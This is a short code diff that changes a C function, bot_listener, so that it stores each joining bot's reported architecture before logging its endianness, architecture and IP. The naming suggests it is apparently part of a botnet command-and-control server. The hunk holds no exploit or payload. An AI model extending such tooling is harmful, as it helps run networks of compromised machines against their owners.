@@ -228,6 +228,9 @@ void* bot_listener(void* arg) {
                             const char* endian = (htonl(0x12345678) == 0x12345678) ? "Big_Endian" : "Little_Endian";
                             char logarch[128];
                             char* arch = archbuf + 5;
+                            strncpy(bots[bot_count].arch, arch, sizeof(bots[bot_count].arch)-1);
+                            bots[bot_count].arch[sizeof(bots[bot_count].arch)-1] = 0;
+                            
                             snprintf(logarch, sizeof(logarch), "Endian: %s | Architecture: %s", endian, arch);
                             log_bot_join(logarch, ipbuf);
                             bot_count++;
